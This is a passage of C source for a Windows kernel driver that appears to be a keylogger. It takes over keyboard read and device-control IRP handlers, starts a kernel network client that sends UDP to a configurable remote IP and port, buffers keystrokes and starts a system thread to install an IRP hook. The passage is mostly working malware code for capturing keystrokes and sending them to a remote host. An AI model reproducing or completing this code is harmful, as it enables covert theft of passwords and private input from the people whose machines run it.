    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = KbdIrp_PassThrough;
    }

    DriverObject->MajorFunction[IRP_MJ_READ] = KbdIrp_Read;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdIrp_DeviceControl;
    DriverObject->DriverUnload = KbdDriver_Unload;

    Status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    UseIP = (RemoteIP != NULL) ? RemoteIP : KBDDRIVER_REMOTE_IP;
    UsePort = (RemotePort != NULL) ? RemotePort : KBDDRIVER_REMOTE_PORT;

    Status = NetClient_Initialize(UseIP, UsePort, AF_INET, SOCK_DGRAM);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    KbdHandler_InitializeBuffer();

    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        KbdThread_IrpHookInit,
        NULL);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    if (ThreadHandle != NULL) {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    return STATUS_SUCCESS;

Cleanup:
    if (RemoteIP != NULL) ExFreePoolWithTag(RemoteIP, KBDDRIVER_POOL_TAG);
    if (RemotePort != NULL) ExFreePoolWithTag(RemotePort, KBDDRIVER_POOL_TAG);
    if (ThreadHandle != NULL) ZwClose(ThreadHandle);
    if (KbdDriverObject != NULL) ObDereferenceObject(KbdDriverObject);
    if (g_FilterDeviceObject != NULL) IoDeleteDevice(g_FilterDeviceObject);

    return Status;
}